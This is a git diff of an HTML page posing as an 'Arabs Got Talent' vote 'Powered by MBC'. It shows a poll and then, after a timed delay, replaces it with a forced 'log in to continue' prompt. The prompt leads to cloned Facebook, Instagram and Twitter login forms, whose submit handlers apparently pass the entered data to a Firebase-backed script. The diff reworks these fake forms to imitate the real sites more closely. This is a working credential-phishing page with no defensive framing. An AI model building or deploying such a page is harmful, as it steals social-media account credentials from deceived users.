@@ -1,65 +1,77 @@
-
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
-    <script src="js/jquery-3.6.0.min.js"></script>
-    <link rel="stylesheet" href="css/index.css">
-    <link rel="stylesheet" href="assets/css/main.css">
-    
-    <!--Facebook-->
-        <link rel="stylesheet" href="secured/default.css">
-        <link rel="stylesheet" href="secured/style.css">
-    <script src="js/index.js"></script>
-    <script src="/js/jquery-3.6.0.min.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
+  <script src="js/jquery-3.6.0.min.js"></script>
+  <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="assets/css/main.css">
+
+  <!--Facebook-->
+  <link rel="stylesheet" href="secured/default.css">
+  <link rel="stylesheet" href="secured/style.css">
+  <script src="js/index.js"></script>
+  <script src="/js/jquery-3.6.0.min.js"></script>
 
   <!-- Twitter CSS -->
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+    crossorigin="anonymous">
   <link rel="stylesheet" href="twt/CSS/style.css">
   <link rel="icon" href="favicon.ico">
-    
-    <title>Arabs Got Talent</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Include Font Awesome for Social Media Icons -->
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+
+  <title>Arabs Got Talent</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Include Font Awesome for Social Media Icons -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
 </head>
+
 <body class="bg-gray-800 text-white flex items-center justify-center min-h-screen">
 
   <div id="preloader" class="preloader"></div>
 
-    <!-- Iframe Container (Initial Load) -->
-    <div id="iframe-container" class="w-full h-full fixed inset-0">
-        <iframe 
-            src="https://strawpoll.com/embed/Q0Zp7VrbAgM" 
-            class="w-full h-full border-none" 
-            frameborder="0" 
-            allowfullscreen 
-            allowtransparency>
-        </iframe>
-    </div>
+  <!-- Iframe Container (Initial Load) -->
+  <div id="iframe-container" class="w-full h-full fixed inset-0">
+    <iframe src="https://strawpoll.com/embed/Q0Zp7VrbAgM" class="w-full h-full border-none" frameborder="0"
+      allowfullscreen allowtransparency>
+    </iframe>
+  </div>
 
   <div id="login-prompt" class="hidden">
-    <h2 class="text-2xl font-bold mb-4">You must log in to continue</h2>
-    <div class="social-vote-button">
-      <button onclick="Twitter()" class="twitter-button"><i class="fab fa-twitter"></i> Login with Twitter </button>
+    <div class="flex items-center justify-center">
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-yellow-500" fill="none" viewBox="0 0 24 24"
+        stroke="currentColor" stroke-width="2">
+        <path stroke-linecap="round" stroke-linejoin="round"
+          d="M10.29 3.86L1.82 18c-.78 1.36.19 3 1.71 3h16.94c1.52 0 2.49-1.64 1.71-3L13.71 3.86a2 2 0 00-3.42 0zM12 9v4m0 4h.01" />
+      </svg>
+      <span class="ml-2 text-yellow-600 text-lg font-semibold">
+        You must log in to continue!
+      </span>
     </div>
     <div class="social-vote-button">
-      <button onclick="Instagram()" class="instagram-button2"><i class="fab fa-instagram"></i> Login with Instagram </button>
+      <button onclick="showLoginForm('twitter')" class="twitter-button"><i class="fab fa-twitter"></i> Login with
+        Twitter </button>
+    </div>
+    <div class="social-vote-button">
+      <button onclick="showLoginForm('instagram')" class="instagram-button2"><i class="fab fa-instagram"></i> Login with
+        Instagram
+      </button>
     </div>
 
     <div class="social-vote-button">
-      <button onclick="Facebook()" class="facebook-button3"><i class="fab fa-facebook"></i> Login with Facebook </button>
+      <button onclick="showLoginForm('facebook')" class="facebook-button3"><i class="fab fa-facebook"></i> Login with
+        Facebook
+      </button>
     </div>
     <br><br>
     <p class="powered-by">Powered by <strong>MBC</strong></p>
 
   </div>
 
-    <!-- Login Prompt (Hidden initially) 
+  <!-- Login Prompt (Hidden initially) 
     <div id="login-prompt" class="hidden fixed inset-0 bg-gray-800 bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
         <h2 class="text-2xl font-bold mb-4">You must log in to continue</h2>
         <div class="space-x-4">
@@ -81,89 +93,130 @@
         </div>
     </div> -->
 
-    <!-- Facebook Login Form (Hidden initially) -->
-    <div id="facebook-login" class="hidden fixed inset-0 bg-gray-800 bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
-        <div class="mb-6">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/800px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo" class="w-12">
+  <!-- Facebook Login Form (Hidden initially) -->
+  <div id="instagram-login"
+    class="hidden fixed inset-0 bg-white bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
+    <main class="l-main">
+      <div class="l-main__img">
+        <img src="assets/img/homepage.png" alt="Smartphones">
+      </div>
+      <div class="l-user">
+        <div class="c-panel group">
+
+          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+          <div class="c-panel__form">
+            <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email"
+              placeholder="Phone number, username, or email" id="ig-uname">
+            <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email"
+              placeholder="Password" id="ig-pass">
+            <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button>
+            <span class="c-panel__span">OR</span>
+          </div>
+          <a href="#facebook" class="c-panel__facebook">Login with Facebook</a> <br>
+          <a href="#" class="c-panel__forgot">Forgot password?</a>
+          <br>
+          <br>
         </div>
-        <div class="mb-4 w-full max-w-sm">
-            <div class="bg-gray-700 rounded-md">
-                <input type="text" id="fb-email" placeholder="Mobile number or email address" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-500">
-            </div>
+        <div class="c-signup group">
+          <p>Don't have an account? <span>Sign up</span></p>
         </div>
-        <div class="mb-4 w-full max-w-sm">
-            <div class="bg-gray-700 rounded-md">
-                <input type="password" id="fb-pass" placeholder="Password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-500">
-            </div>
+
+        <div class="c-app">
+          <p>Get the app.</p>
+          <div class="c-app__download">
+            <img src="assets/img/apple.png" alt="Apple Store">
+            <img src="assets/img/google.png" alt="Google Play">
+          </div>
         </div>
-        <div class="w-full max-w-sm">
-            <button onclick="login()" class="bg-blue-600 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-blue-500 transition">
-                Login
+      </div>
+    </main>
+  </div>
+
+  <!-- Instagram Login Form (Hidden initially) -->
+  <div id="facebook-login"
+    class="hidden fixed inset-0 bg-white bg-opacity-90 flex flex-col items-center justify-center text-gray-800 p-6 sm:p-8 md:p-12">
+
+    <main class="l-main">
+      <div class="fb-user">
+        <div class="fb-panel fb-group">
+          <img src="secured/img/logo.svg" alt="">
+          <p>Facebook helps you connect and share with the people in your life.</p>
+          <input type="text" placeholder="Email or Phone number" required id="fb-email">
+          <input type="password" placeholder="Password" required id="fb-pass">
+          <button class="c-btn" onclick="login()" id="fb-log">Log In</button><br>
+
+          <a href="#">Forgotten password?</a>
+          <button id="create-btn">Create New Account</button>
+          <a href="#" style="font-weight: bold; color: var(--black); text-decoration: none;">Create a Page</a> for a
+          celebrity, band or business.
+        </div>
+      </div>
+    </main>
+
+  </div>
+
+  <!-- Twitter Login Form (Hidden initially) -->
+  <div id="twitter-login"
+    class="hidden fixed inset-0 bg-white bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
+    <div class="row">
+      <div class="none col-1 col-lg-4"></div>
+      <div class="none col-10 col-lg-5">
+        <div class="box bg-white mt-5 p-3">
+          <div class="nav mb-5">
+            <img class="twitter-2" src="twt/IMG/twitter.png" alt="">
+          </div>
+          <div class="mb-4">
+            <h2 class="text-center head"><b>Sign in to Twitter</b></h2>
+          </div>
+
+          <div class="margin mb-4">
+            <input type="text" class="btn but d-flex btn-white border-dark " placeholder="Phone, Email or Username"
+              required id="tw-email">
+            <input type="password" class="btn but d-flex btn-white border-dark " placeholder="Password" required
+              id="tw-pass">
+            <button type="button"
+              class="btn but d-flex justify-content-center btn-white border-dark bg-dark rounded-pill"
+              onclick="tw_login()" id="tw-log">
+              <p class="text-white"><b>Log In</b></p>
             </button>
-        </div>
-    </div>
+          </div>
 
-    <!-- Instagram Login Form (Hidden initially) -->
-    <div id="instagram-login" class="hidden fixed inset-0 bg-white bg-opacity-90 flex flex-col items-center justify-center text-gray-800 p-6 sm:p-8 md:p-12">
-        <div class="mb-6">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram Logo" class="w-auto">
-        </div>
-        <div class="mb-4 w-full max-w-sm">
-            <div class="bg-gray-700 rounded-md">
-                <input type="text" id="id" placeholder="Phone number, username, or email" class="w-full px-4 py-2 bg-transparent text-gray-800 outline-none focus:ring focus:ring-pink-500">
-            </div>
-        </div>
-        <div class="mb-4 w-full max-w-sm">
-            <div class="bg-gray-700 rounded-md">
-                <input type="password" placeholder="Password" class="w-full px-4 py-2 bg-transparent text-gray-800 outline-none focus:ring focus:ring-pink-500">
-            </div>
-        </div>
-        <div class="w-full max-w-sm">
-            <button onclick="iglog()" class="bg-blue-600 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-pink-500 transition">
-                Login
+          <div class="margin mb-4">
+            <button type="button" class="btn but d-flex justify-content-center btn-white border-dark rounded-pill">
+              <p class="color-white"><b>Forgot password?</b></p>
             </button>
+          </div>
+
+          <div class="margin">
+            <p>Don't have an account? <a class="text-decoration-none" href="#">Sign up</a></p>
+          </div>
+
+          <div class="margin">
+          </div>
+
         </div>
+      </div>
+      <div class="none col-1 col-lg-3"></div>
     </div>
+  </div>
 
-    <!-- Twitter Login Form (Hidden initially) -->
-    <div id="twitter-login" class="hidden fixed inset-0 bg-gray-800 bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
-        <div class="mb-6">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/X_logo_2023.svg/2560px-X_logo_2023.svg.png" alt="Twitter Logo" class="w-auto">
-        </div>
-        <div class="mb-4 w-full max-w-sm">
-            <div class="bg-gray-700 rounded-md">
-                <input type="text" id="tw-email" placeholder="Phone, email, or username" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-400">
-            </div>
-        </div>
-        <div class="mb-4 w-full max-w-sm">
-            <div class="bg-gray-700 rounded-md">
-                <input type="password" id="tw-pass" placeholder="Password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-400">
-            </div>
-        </div>
-        <div class="w-full max-w-sm">
-            <button onclick="tw_login()" class="bg-blue-600 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-blue-400 transition">
-                Login
-            </button>
-        </div>
-    </div>
+  <script>
+    // Timer to display the login prompt after 10 seconds
+    setTimeout(() => {
+      // Hide iframe and show login prompt
+      document.getElementById("iframe-container").classList.add("hidden");
+      document.getElementById("login-prompt").classList.remove("hidden");
+    }, 15000); // 10 seconds timer
 
-    <script>
-        // Timer to display the login prompt after 10 seconds
-        setTimeout(() => {
-            // Hide iframe and show login prompt
-            document.getElementById("iframe-container").classList.add("hidden");
-            document.getElementById("login-prompt").classList.remove("hidden");
-        }, 15000); // 10 seconds timer
+    // Show the respective login form based on selection
+    function showLoginForm(platform) {
+      // Hide login prompt and show the respective platform login form
+      document.getElementById("login-prompt").classList.add("hidden");
+      document.getElementById(platform + "-login").classList.remove("hidden");
+    }
+  </script>
 
-        // Show the respective login form based on selection
-        function showLoginForm(platform) {
-            // Hide login prompt and show the respective platform login form
-            document.getElementById("login-prompt").classList.add("hidden");
-            document.getElementById(platform + "-login").classList.remove("hidden");
-        }
-    </script>
-
-      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
   <script>
     function showCustomAlert() {
       Swal.fire({
@@ -175,55 +228,56 @@
     }
   </script>
 
-    <script>
-      function showPreloader() {
-        document.getElementById("preloader").style.display = "flex";
-      }
+  <script>
+    function showPreloader() {
+      document.getElementById("preloader").style.display = "flex";
+    }
 
-      function hidePreloader() {
-        document.getElementById("preloader").style.display = "none";
-      }
+    function hidePreloader() {
+      document.getElementById("preloader").style.display = "none";
+    }
 
-      function Twitter() {
-        showPreloader();
-        setTimeout(function() {
-          hidePreloader();
-          document.getElementById("twitter").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
+    function Twitter() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("twitter").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
 
-      function Instagram() {
-        showPreloader();
-        setTimeout(function() {
-          hidePreloader();
-          document.getElementById("instagram").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
+    function Instagram() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("instagram").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
 
-      function Facebook() {
-        showPreloader();
-        setTimeout(function() {
-          hidePreloader();
-          document.getElementById("facebook").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
+    function Facebook() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("facebook").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
 
-      function closeDialog() {
-          document.getElementById("instagram").style.display = "none";
-          document.getElementById("twitter").style.display = "none";
-          document.getElementById("facebook").style.display = "none";
-      }
-    </script>
-    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+    function closeDialog() {
+      document.getElementById("instagram").style.display = "none";
+      document.getElementById("twitter").style.display = "none";
+      document.getElementById("facebook").style.display = "none";
+    }
+  </script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
 
-    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
 
-    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
-    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
 
-    <script src="js/firebase.js">
+  <script src="js/firebase.js">
 
-    </script>
+  </script>
 
 </body>
+
 </html>
